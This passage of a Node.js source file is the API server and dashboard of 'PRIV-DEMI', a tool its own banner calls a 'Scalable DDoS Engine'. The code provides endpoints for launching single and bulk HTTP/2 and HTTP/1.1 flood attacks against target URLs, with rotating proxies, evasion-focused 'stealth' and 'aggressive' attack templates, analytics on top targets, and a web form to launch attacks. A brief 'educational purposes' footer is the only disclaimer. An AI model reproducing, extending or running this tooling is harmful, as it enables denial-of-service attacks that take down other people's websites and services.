                        error: 'Unauthorized',
                        message: 'API key is required'
                    });
                }
                
                if (apiKey !== config.apiKey) {
                    return res.status(403).json({
                        error: 'Forbidden',
                        message: 'Invalid API key'
                    });
                }
            }
            
            next();
        });
    }
    
    initializeRoutes() {
        // Health check
        this.app.get('/health', (req, res) => {
            res.json({
                status: 'healthy',
                timestamp: new Date().toISOString(),
                uptime: process.uptime(),
                memory: process.memoryUsage(),
                attacks: this.attackManager.stats,
                proxies: this.proxyManager.getStats(),
                ws: this.wsServer ? this.wsServer.getStats() : null
            });
        });
        
        // System info
        this.app.get('/system', (req, res) => {
            res.json(this.attackManager.getSystemStats());
        });
        
        // Attack management
        this.app.post('/api/attacks', async (req, res) => {
            try {
                const attackConfig = req.body;
                
                // Set defaults
                attackConfig.duration = attackConfig.duration || 60;
                attackConfig.threads = attackConfig.threads || 50;
                attackConfig.rate = attackConfig.rate || 100;
                attackConfig.options = attackConfig.options || {};
                attackConfig.options.version = attackConfig.options.version || '2';
                attackConfig.options.h2ConcurrentStreams = attackConfig.options.h2ConcurrentStreams || 50;
                
                const attackId = await this.attackManager.launchAttack(attackConfig);
                
                res.status(202).json({
                    success: true,
                    message: 'Attack launched successfully',
                    attackId,
                    config: attackConfig,
                    monitor: {
                        stats: `/api/attacks/${attackId}/stats`,
                        status: `/api/attacks/${attackId}`,
                        stop: `/api/attacks/${attackId}/stop`
                    }
                });
                
            } catch (error) {
                logger.error('Failed to launch attack', error);
                res.status(400).json({
                    success: false,
                    error: error.message
                });
            }
        });
        
        // Get all attacks
        this.app.get('/api/attacks', (req, res) => {
            const limit = parseInt(req.query.limit) || 50;
            const offset = parseInt(req.query.offset) || 0;
            const status = req.query.status; // active, completed, failed, all
            
            const attacks = this.attackManager.getAllAttacks(limit, offset);
            
            if (status) {
                if (status === 'active') {
                    attacks.history = [];
                } else if (status === 'history') {
                    attacks.active = [];
                }
            }
            
            res.json({
                success: true,
                ...attacks,
                globalStats: this.attackManager.stats
            });
        });
        
        // Get attack details
        this.app.get('/api/attacks/:attackId', (req, res) => {
            const { attackId } = req.params;
            const attack = this.attackManager.getAttack(attackId);
            
            if (!attack) {
                return res.status(404).json({
                    success: false,
                    error: 'Attack not found'
                });
            }
            
            res.json({
                success: true,
                attack
            });
        });
        
        // Get attack stats
        this.app.get('/api/attacks/:attackId/stats', (req, res) => {
            const { attackId } = req.params;
            const attack = this.attackManager.getAttack(attackId);
            
            if (!attack) {
                return res.status(404).json({
                    success: false,
                    error: 'Attack not found'
                });
            }
            
            res.json({
                success: true,
                attackId,
                stats: attack.stats,
                status: attack.status,
                duration: attack.duration,
                estimatedCompletion: attack.status === 'running' ? 
                    Math.max(0, attack.config.duration - Math.floor((Date.now() - attack.startTime) / 1000)) : null
            });
        });
        
        // Stop attack
        this.app.post('/api/attacks/:attackId/stop', (req, res) => {
            const { attackId } = req.params;
            
            try {
                const stopped = this.attackManager.stopAttack(attackId);
                
                if (stopped) {
                    res.json({
                        success: true,
                        message: 'Attack stopped successfully',
                        attackId
                    });
                } else {
                    res.status(400).json({
                        success: false,
                        error: 'Attack not found or already stopped'
                    });
                }
            } catch (error) {
                res.status(400).json({
                    success: false,
                    error: error.message
                });
            }
        });
        
        // Get attack logs
        this.app.get('/api/attacks/:attackId/logs', (req, res) => {
            const { attackId } = req.params;
            const limit = parseInt(req.query.limit) || 100;
            const offset = parseInt(req.query.offset) || 0;
            
            const attack = this.attackManager.getAttack(attackId);
            
            if (!attack) {
                return res.status(404).json({
                    success: false,
                    error: 'Attack not found'
                });
            }
            
            const logs = attack.logs.slice(offset, offset + limit);
            
            res.json({
                success: true,
                attackId,
                logs,
                total: attack.logs.length,
                hasMore: offset + limit < attack.logs.length
            });
        });
        
        // Proxy management
        this.app.get('/api/proxies', (req, res) => {
            const count = parseInt(req.query.count) || 100;
            const refresh = req.query.refresh === 'true';
            
            if (refresh) {
                this.proxyManager.refreshProxies()
                    .then(result => {
                        res.json({
                            success: true,
                            message: 'Proxies refreshed',
                            ...result,
                            stats: this.proxyManager.getStats()
                        });
                    })
                    .catch(error => {
                        res.status(500).json({
                            success: false,
                            error: error.message
                        });
                    });
            } else {
                const proxies = this.proxyManager.getProxies(count);
                
                res.json({
                    success: true,
                    proxies,
                    stats: this.proxyManager.getStats()
                });
            }
        });
        
        // Refresh proxies
        this.app.post('/api/proxies/refresh', async (req, res) => {
            try {
                const { customSources } = req.body;
                
                const result = await this.proxyManager.refreshProxies(customSources || []);
                
                if (result.success) {
                    res.json({
                        success: true,
                        ...result
                    });
                } else {
                    res.status(500).json({
                        success: false,
                        error: result.error
                    });
                }
            } catch (error) {
                res.status(500).json({
                    success: false,
                    error: error.message
                });
            }
        });
        
        // Bulk attack launcher
        this.app.post('/api/attacks/bulk', async (req, res) => {
            try {
                const { targets, config: baseConfig, staggerDelay = 1000 } = req.body;
                
                if (!Array.isArray(targets) || targets.length === 0) {
                    return res.status(400).json({
                        success: false,
                        error: 'Targets array is required'
                    });
                }
                
                const attackIds = [];
                const errors = [];
                
                // Launch attacks with staggering
                for (let i = 0; i < targets.length; i++) {
                    try {
                        await new Promise(resolve => setTimeout(resolve, i * staggerDelay));
                        
                        const attackConfig = {
                            ...baseConfig,
                            target: targets[i]
                        };
                        
                        const attackId = await this.attackManager.launchAttack(attackConfig);
                        attackIds.push(attackId);
                        
                    } catch (error) {
                        errors.push({
                            target: targets[i],
                            error: error.message
                        });
                    }
                }
                
                res.json({
                    success: true,
                    message: `Launched ${attackIds.length} attacks`,
                    attackIds,
                    errors,
                    totalTargets: targets.length
                });
                
            } catch (error) {
                res.status(500).json({
                    success: false,
                    error: error.message
                });
            }
        });
        
        // Attack templates
        this.app.get('/api/templates', (req, res) => {
            // Default attack profiles
            const templates = {
                stealth: {
                    name: 'Stealth Attack',
                    description: 'Low and slow attack to avoid detection',
                    config: {
                        threads: 20,
                        rate: 50,
                        options: {
                            cookies: true,
                            headfull: true,
                            human: true,
                            version: '2',
                            h2ConcurrentStreams: 30,
                            cache: true,
                            debug: false
                        }
                    }
                },
                balanced: {
                    name: 'Balanced Attack',
                    description: 'Moderate attack with good success rate',
                    config: {
                        threads: 100,
                        rate: 500,
                        options: {
                            cookies: true,
                            headfull: false,
                            human: true,
                            version: '2',
                            h2ConcurrentStreams: 50,
                            cache: true,
                            debug: false
                        }
                    }
                },
                aggressive: {
                    name: 'Aggressive Attack',
                    description: 'Maximum power attack',
                    config: {
                        threads: 500,
                        rate: 2000,
                        options: {
                            cookies: false,
                            headfull: false,
                            human: false,
                            version: '2',
                            h2ConcurrentStreams: 100,
                            cache: false,
                            debug: false
                        }
                    }
                },
                http1: {
                    name: 'HTTP/1.1 Attack',
                    description: 'HTTP/1.1 only attack',
                    config: {
                        threads: 200,
                        rate: 1000,
                        options: {
                            cookies: true,
                            headfull: false,
                            human: false,
                            version: '1',
                            cache: false,
                            debug: false
                        }
                    }
                }
            };
            
            res.json({
                success: true,
                templates
            });
        });
        
        // Analytics
        this.app.get('/api/analytics', (req, res) => {
            const period = req.query.period || '24h';
            
            const stats = this.attackManager.stats;
            const allAttacks = this.attackManager.getAllAttacks(1000, 0);
            
            // Calculate success rate
            const successRate = stats.totalRequests > 0 ? 
                ((stats.totalSuccess / stats.totalRequests) * 100).toFixed(2) : 0;
            
            // Calculate average RPS
            const totalDuration = Array.from(this.attackManager.attacks.values())
                .filter(a => a.endTime)
                .reduce((sum, a) => sum + (a.endTime - a.startTime), 0);
            
            const avgRPS = totalDuration > 0 ? 
                Math.round((stats.totalRequests / totalDuration) * 1000) : 0;
            
            res.json({
                success: true,
                period,
                summary: {
                    totalAttacks: stats.totalAttacks,
                    activeAttacks: stats.activeAttacks,
                    totalRequests: stats.totalRequests,
                    totalSuccess: stats.totalSuccess,
                    totalErrors: stats.totalErrors,
                    successRate: `${successRate}%`,
                    averageRPS: avgRPS,
                    peakRPS: stats.peakRPS,
                    currentRPS: stats.currentRPS
                },
                recentAttacks: allAttacks.history.slice(0, 10),
                topTargets: this.getTopTargets(),
                errorDistribution: this.getErrorDistribution()
            });
        });
        
        // Dashboard
        this.app.get('/dashboard', (req, res) => {
            const dashboardHTML = `
            <!DOCTYPE html>
            <html>
            <head>
                <title>PRIV-DEMI Attack Dashboard</title>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    * { margin: 0; padding: 0; box-sizing: border-box; }
                    body { 
                        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        min-height: 100vh;
                        padding: 20px;
                    }
                    .container {
                        max-width: 1400px;
                        margin: 0 auto;
                        background: rgba(255, 255, 255, 0.95);
                        border-radius: 20px;
                        padding: 30px;
                        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
                    }
                    header {
                        text-align: center;
                        margin-bottom: 40px;
                        padding-bottom: 20px;
                        border-bottom: 2px solid #e0e0e0;
                    }
                    h1 {
                        color: #333;
                        font-size: 2.8em;
                        margin-bottom: 10px;
                        background: linear-gradient(45deg, #667eea, #764ba2);
                        -webkit-background-clip: text;
                        -webkit-text-fill-color: transparent;
                    }
                    .subtitle {
                        color: #666;
                        font-size: 1.2em;
                    }
                    .stats-grid {
                        display: grid;
                        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                        gap: 20px;
                        margin-bottom: 40px;
                    }
                    .stat-card {
                        background: white;
                        border-radius: 15px;
                        padding: 25px;
                        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
                        transition: transform 0.3s ease;
                    }
                    .stat-card:hover {
                        transform: translateY(-5px);
                    }
                    .stat-card h3 {
                        color: #666;
                        font-size: 1em;
                        margin-bottom: 10px;
                        text-transform: uppercase;
                        letter-spacing: 1px;
                    }
                    .stat-value {
                        font-size: 2.5em;
                        font-weight: bold;
                        color: #333;
                    }
                    .stat-change {
                        font-size: 0.9em;
                        margin-top: 5px;
                    }
                    .positive { color: #10b981; }
                    .negative { color: #ef4444; }
                    .section {
                        margin-bottom: 40px;
                    }
                    .section-title {
                        font-size: 1.5em;
                        color: #333;
                        margin-bottom: 20px;
                        padding-bottom: 10px;
                        border-bottom: 2px solid #e0e0e0;
                    }
                    table {
                        width: 100%;
                        border-collapse: collapse;
                        background: white;
                        border-radius: 10px;
                        overflow: hidden;
                        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
                    }
                    th {
                        background: linear-gradient(45deg, #667eea, #764ba2);
                        color: white;
                        padding: 15px;
                        text-align: left;
                        font-weight: 600;
                    }
                    td {
                        padding: 15px;
                        border-bottom: 1px solid #e0e0e0;
                    }
                    tr:hover {
                        background: #f8f9fa;
                    }
                    .status {
                        padding: 5px 15px;
                        border-radius: 20px;
                        font-size: 0.9em;
                        font-weight: bold;
                    }
                    .status-running { background: #d1fae5; color: #065f46; }
                    .status-completed { background: #dbeafe; color: #1e40af; }
                    .status-stopped { background: #fef3c7; color: #92400e; }
                    .status-failed { background: #fee2e2; color: #991b1b; }
                    .btn {
                        padding: 10px 20px;
                        border: none;
                        border-radius: 8px;
                        cursor: pointer;
                        font-weight: bold;
                        transition: all 0.3s ease;
                    }
                    .btn-primary {
                        background: linear-gradient(45deg, #667eea, #764ba2);
                        color: white;
                    }
                    .btn-primary:hover {
                        transform: translateY(-2px);
                        box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
                    }
                    .form-group {
                        margin-bottom: 20px;
                    }
                    label {
                        display: block;
                        margin-bottom: 5px;
                        color: #555;
                        font-weight: 600;
                    }
                    input, select {
                        width: 100%;
                        padding: 12px;
                        border: 2px solid #e0e0e0;
                        border-radius: 8px;
                        font-size: 1em;
                        transition: border 0.3s ease;
                    }
                    input:focus, select:focus {
                        outline: none;
                        border-color: #667eea;
                    }
                    .form-row {
                        display: grid;
                        grid-template-columns: 1fr 1fr;
                        gap: 20px;
                    }
                    .real-time {
                        background: #1a1a1a;
                        color: #00ff00;
                        padding: 20px;
                        border-radius: 10px;
                        font-family: 'Courier New', monospace;
                        height: 400px;
                        overflow-y: auto;
                        margin-bottom: 20px;
                    }
                    .real-time .entry {
                        margin-bottom: 5px;
                        padding: 5px;
                        border-bottom: 1px solid #333;
                    }
                    .real-time .timestamp {
                        color: #888;
                    }
                    footer {
                        text-align: center;
                        margin-top: 40px;
                        padding-top: 20px;
                        border-top: 2px solid #e0e0e0;
                        color: #666;
                    }
                    .ws-status {
                        display: inline-block;
                        width: 12px;
                        height: 12px;
                        border-radius: 50%;
                        margin-right: 8px;
                    }
                    .ws-connected { background: #10b981; }
                    .ws-disconnected { background: #ef4444; }
                </style>
            </head>
            <body>
                <div class="container">
                    <header>
                        <h1>🚀 PRIV-DEMI ATTACK DASHBOARD</h1>
                        <p class="subtitle">Real-time DDoS attack management and monitoring</p>
                        <div style="margin-top: 20px;">
                            <span class="ws-status ws-disconnected" id="wsStatus"></span>
                            <span id="wsMessage">Connecting to WebSocket...</span>
                        </div>
                    </header>
                    
                    <div class="stats-grid" id="statsGrid">
                        <!-- Stats will be populated by JavaScript -->
                    </div>
                    
                    <div class="section">
                        <h2 class="section-title">Launch New Attack</h2>
                        <form id="attackForm">
                            <div class="form-row">
                                <div class="form-group">
                                    <label for="target">Target URL</label>
                                    <input type="url" id="target" placeholder="https://example.com" required>
                                </div>
                                <div class="form-group">
                                    <label for="duration">Duration (seconds)</label>
                                    <input type="number" id="duration" value="60" min="1" max="3600" required>
                                </div>
                            </div>
                            
                            <div class="form-row">
                                <div class="form-group">
                                    <label for="threads">Threads</label>
                                    <input type="number" id="threads" value="100" min="1" max="1000" required>
                                </div>
                                <div class="form-group">
                                    <label for="rate">Requests per second</label>
                                    <input type="number" id="rate" value="500" min="1" max="10000" required>
                                </div>
                            </div>
                            
                            <div class="form-row">
                                <div class="form-group">
                                    <label for="version">HTTP Version</label>
                                    <select id="version">
                                        <option value="2">HTTP/2</option>
                                        <option value="1">HTTP/1.1</option>
                                    </select>
                                </div>
                                <div class="form-group">
                                    <label for="streams">H2 Concurrent Streams</label>
                                    <input type="number" id="streams" value="50" min="1" max="1000">
                                </div>
                            </div>
                            
                            <div class="form-row">
                                <div class="form-group">
                                    <label>
                                        <input type="checkbox" id="cookies" checked> Enable Cookies
                                    </label>
                                </div>
                                <div class="form-group">
                                    <label>
                                        <input type="checkbox" id="human"> Human-like Behavior
                                    </label>
                                </div>
                            </div>
                            
                            <button type="submit" class="btn btn-primary">🚀 Launch Attack</button>
                        </form>
                    </div>
                    
                    <div class="section">
                        <h2 class="section-title">Active Attacks</h2>
                        <div id="activeAttacks">
                            <!-- Active attacks will be populated by JavaScript -->
                        </div>
                    </div>
                    
                    <div class="section">
                        <h2 class="section-title">Real-time Logs</h2>
                        <div class="real-time" id="realtimeLogs">
                            <div class="entry">
                                <span class="timestamp">[00:00:00]</span> 
                                <span>System: Dashboard loaded successfully</span>
                            </div>
                        </div>
                    </div>
                    
                    <footer>
                        <p>PRIV-DEMI API v2.0.0 | Made with ❤️ for educational purposes</p>
                        <p style="margin-top: 10px; font-size: 0.9em; color: #888;">
                            ⚠️ Use responsibly and only on authorized targets
                        </p>
                    </footer>
                </div>
                
                <script>
                    // WebSocket connection
                    let ws = null;
                    let reconnectInterval = null;
                    
                    function connectWebSocket() {
                        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
                        const wsUrl = protocol + '//' + window.location.host + '/ws';
                        
                        ws = new WebSocket(wsUrl);
                        
                        ws.onopen = () => {
                            console.log('WebSocket connected');
                            document.getElementById('wsStatus').className = 'ws-status ws-connected';
                            document.getElementById('wsMessage').textContent = 'Connected to real-time updates';
                            
                            // Subscribe to system updates
                            ws.send(JSON.stringify({
                                type: 'subscribe',
                                channel: 'system'
                            }));
                            
                            // Clear reconnect interval
                            if (reconnectInterval) {
                                clearInterval(reconnectInterval);
                                reconnectInterval = null;
                            }
                        };
                        
                        ws.onmessage = (event) => {
                            const data = JSON.parse(event.data);
                            handleWebSocketMessage(data);
                        };
                        
                        ws.onclose = () => {
                            console.log('WebSocket disconnected');
                            document.getElementById('wsStatus').className = 'ws-status ws-disconnected';
                            document.getElementById('wsMessage').textContent = 'Disconnected - Attempting to reconnect...';
                            
                            // Attempt to reconnect
                            if (!reconnectInterval) {
                                reconnectInterval = setInterval(connectWebSocket, 5000);
                            }
                        };
                        
                        ws.onerror = (error) => {
                            console.error('WebSocket error:', error);
                        };
                    }
                    
                    function handleWebSocketMessage(data) {
                        switch(data.type) {
                            case 'welcome':
                                console.log('Connected to server:', data.server);
                                break;
                                
                            case 'system_stats':
                                updateStatsGrid(data.data);
                                break;
                                
                            case 'attack_update':
                                updateAttackDisplay(data.data);
                                break;
                                
                            case 'log':
                                addLogEntry(data.data);
                                break;
                        }
                    }
                    
                    function updateStatsGrid(stats) {
                        const statsGrid = document.getElementById('statsGrid');
                        
                        const statCards = [
                            { title: 'Active Attacks', value: stats.attacks.activeAttacks, change: '+2' },
                            { title: 'Total Requests', value: stats.attacks.totalRequests.toLocaleString(), change: null },
                            { title: 'Current RPS', value: stats.attacks.currentRPS.toLocaleString(), change: '+150' },
                            { title: 'Success Rate', value: stats.attacks.totalRequests > 0 ? 
                                ((stats.attacks.totalSuccess / stats.attacks.totalRequests) * 100).toFixed(1) + '%' : '0%', change: null },
                            { title: 'Peak RPS', value: stats.attacks.peakRPS.toLocaleString(), change: null },
                            { title: 'System Memory', value: stats.system.memory.heapUsed, change: null }
                        ];
                        
                        statsGrid.innerHTML = statCards.map(card => \`
                            <div class="stat-card">
                                <h3>\${card.title}</h3>
                                <div class="stat-value">\${card.value}</div>
                                \${card.change ? \`<div class="stat-change \${card.change.startsWith('+') ? 'positive' : 'negative'}">\${card.change}</div>\` : ''}
                            </div>
                        \`).join('');
                    }
                    
                    function updateAttackDisplay(attack) {
                        // Update or add attack to the display
                        console.log('Attack update:', attack);
                    }
                    
                    function addLogEntry(log) {
                        const logsContainer = document.getElementById('realtimeLogs');
                        const entry = document.createElement('div');
                        entry.className = 'entry';
                        
                        const timestamp = new Date(log.timestamp).toLocaleTimeString();
                        entry.innerHTML = \`<span class="timestamp">[\${timestamp}]</span> <span>\${log.message}</span>\`;
                        
                        logsContainer.appendChild(entry);
                        logsContainer.scrollTop = logsContainer.scrollHeight;
                    }
                    
                    // Attack form submission
                    document.getElementById('attackForm').addEventListener('submit', async (e) => {
                        e.preventDefault();
                        
                        const attackConfig = {
                            target: document.getElementById('target').value,
                            duration: parseInt(document.getElementById('duration').value),
                            threads: parseInt(document.getElementById('threads').value),
                            rate: parseInt(document.getElementById('rate').value),
                            options: {
                                cookies: document.getElementById('cookies').checked,
                                human: document.getElementById('human').checked,
                                version: document.getElementById('version').value,
                                h2ConcurrentStreams: parseInt(document.getElementById('streams').value) || 50
                            }
                        };
                        
                        try {
                            const response = await fetch('/api/attacks', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify(attackConfig)
                            });
                            
                            const result = await response.json();
                            
                            if (result.success) {
                                alert(\`Attack launched successfully!\\nAttack ID: \${result.attackId}\`);
                                
                                // Subscribe to this attack's updates
                                if (ws && ws.readyState === WebSocket.OPEN) {
                                    ws.send(JSON.stringify({
                                        type: 'subscribe',
                                        channel: 'attack',
                                        attackId: result.attackId
                                    }));
                                }
                            } else {
                                alert(\`Failed to launch attack: \${result.error}\`);
                            }
                        } catch (error) {
                            alert(\`Error: \${error.message}\`);
                        }
                    });
                    
                    // Initialize WebSocket connection
                    connectWebSocket();
                    
                    // Fetch initial data
                    fetch('/system')
                        .then(response => response.json())
                        .then(data => updateStatsGrid(data))
                        .catch(console.error);
                </script>
            </body>
            </html>
            `;
            
            res.send(dashboardHTML);
        });
        
        // 404 handler
        this.app.use((req, res) => {
            res.status(404).json({
                success: false,
                error: 'Endpoint not found',
                path: req.path,
                method: req.method
            });
        });
        
        // Error handler
        this.app.use((err, req, res, next) => {
            logger.error('Unhandled error', err);
            
            res.status(500).json({
                success: false,
                error: 'Internal server error',
                message: config.environment === 'development' ? err.message : 'An unexpected error occurred',
                requestId: req.requestId
            });
        });
    }
    
    initializeWebSocket() {
        this.wsServer = new WebSocketServer(this.server);
        
        // Connect Attack Manager to WebSocket for broadcasting
        this.attackManager.setBroadcastCallback((attackId, data) => {
            this.wsServer.broadcastToAttack(attackId, data);
        });
        
        // Broadcast system stats periodically
        setInterval(() => {
            const systemStats = this.attackManager.getSystemStats();
            this.wsServer.broadcastToSystem({
                type: 'system_stats',
                data: systemStats,
                timestamp: Date.now()
            });
        }, 2000);
        
        logger.info('WebSocket server connected to attack manager');
    }
    
    initializeScheduledTasks() {
        // Auto-refresh proxies
        setInterval(() => {
            this.proxyManager.refreshProxies()
                .then(result => {
                    if (result.success) {
                        logger.info(`Auto-refreshed proxies: ${result.count} proxies available`);
                    }
                })
                .catch(error => {
                    logger.error('Failed to auto-refresh proxies', error);
                });
        }, config.proxyRefreshInterval * 1000);
        
        // Cleanup old attack data (keep last 1000 attacks)
        setInterval(() => {
            this.cleanupOldAttacks();
        }, 3600000); // Every hour
        
        logger.info('Scheduled tasks initialized');
    }
    
    cleanupOldAttacks() {
        const attacks = Array.from(this.attackManager.attacks.values());
        const completedAttacks = attacks.filter(a => a.status !== 'running');
        
        // Keep only last 1000 completed attacks
        if (completedAttacks.length > 1000) {
            completedAttacks
                .sort((a, b) => b.endTime - a.endTime)
                .slice(1000)
                .forEach(attack => {
                    this.attackManager.attacks.delete(attack.id);
                });
            
            logger.debug(`Cleaned up ${completedAttacks.length - 1000} old attacks`);
        }
    }
    
    getTopTargets() {
        const attacks = Array.from(this.attackManager.attacks.values());
        const targetMap = new Map();
        
        attacks.forEach(attack => {
            if (attack.config.target) {
                const target = attack.config.target;
                targetMap.set(target, (targetMap.get(target) || 0) + 1);
            }
        });
        
        return Array.from(targetMap.entries())
            .sort((a, b) => b[1] - a[1])
            .slice(0, 10)
            .map(([target, count]) => ({ target, count }));
    }
    
    getErrorDistribution() {
        const attacks = Array.from(this.attackManager.attacks.values());
        
        const distribution = {
            success: 0,
            errors: 0,
            goaway: 0,
            forbidden: 0
        };
        
        attacks.forEach(attack => {
            distribution.success += attack.stats.success || 0;
            distribution.errors += attack.stats.errors || 0;
            distribution.goaway += attack.stats.goaway || 0;
            distribution.forbidden += attack.stats.forbidden || 0;
        });
        
        return distribution;
    }
    
    start() {
        return new Promise((resolve, reject) => {
            this.server.listen(config.port, config.host, () => {
                logger.info(`🚀 API Server started on http://${config.host}:${config.port}`);
                logger.info(`📊 Dashboard: http://${config.host}:${config.port}/dashboard`);
                logger.info(`🔌 WebSocket: ws://${config.host}:${config.port}/ws`);
                logger.info(`🔑 API Key: ${config.apiKey.substring(0, 8)}... (set via API_KEY env var)`);
                logger.info(`⚡ Environment: ${config.environment}`);
                logger.info(`🎯 Max concurrent attacks: ${config.maxConcurrentAttacks}`);
                
                // Banner
                console.log(`
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     🚀 PRIV-DEMI API v2.0 - GODMODE ENABLED 🚀              ║
║                                                              ║
║   🔥 Scalable DDoS Engine                                    ║
║   🌪 Million Request Capacity                                ║
║   🛡 Advanced Evasion & Stealth                              ║
║   📊 Real-time Analytics                                     ║
║   ⚡ Production Ready API                                    ║
║                                                              ║
║   API Base URL: http://${config.host}:${config.port}       ║
║   Dashboard: http://${config.host}:${config.port}/dashboard ║
║   WebSocket: ws://${config.host}:${config.port}/ws         ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
                `);
                
                resolve();
            });
            
            this.server.on('error', reject);
        });
    }
    
    stop() {
        return new Promise((resolve) => {
            // Stop all active attacks
            for (const [attackId, attack] of this.attackManager.attacks) {
                if (attack.status === 'running' && attack.worker) {
                    attack.worker.kill('SIGTERM');
                }
            }
            
            // Close server
            this.server.close(() => {
                logger.info('API Server stopped');
                resolve();
            });
        });
    }
}

// ============================================
// CLUSTER MODE
// ============================================

if (cluster.isMaster && config.environment === 'production') {
    logger.info(`Master ${process.pid} is running`);
    
    // Fork workers
    for (let i = 0; i < config.workerCount; i++) {
        cluster.fork();
    }
    
    cluster.on('exit', (worker, code, signal) => {
        logger.warn(`Worker ${worker.process.pid} died. Restarting...`);
        cluster.fork();
    });
    
} else {
    // Worker process
    const apiServer = new APIServer();
    
    // Handle graceful shutdown
    process.on('SIGTERM', () => {
        logger.info('Received SIGTERM, shutting down gracefully...');
        apiServer.stop().then(() => process.exit(0));
    });
    
    process.on('SIGINT', () => {
        logger.info('Received SIGINT, shutting down gracefully...');
        apiServer.stop().then(() => process.exit(0));
    });
    
    // Start server
    apiServer.start().catch(error => {
        logger.error('Failed to start API server', error);
        process.exit(1);
    });
}

// ============================================
// MODULE EXPORTS (for testing)
// ============================================

module.exports = {
    APIServer,
    AttackManager,
    ProxyManager,
    RateLimiter,
    Logger,
    config
};
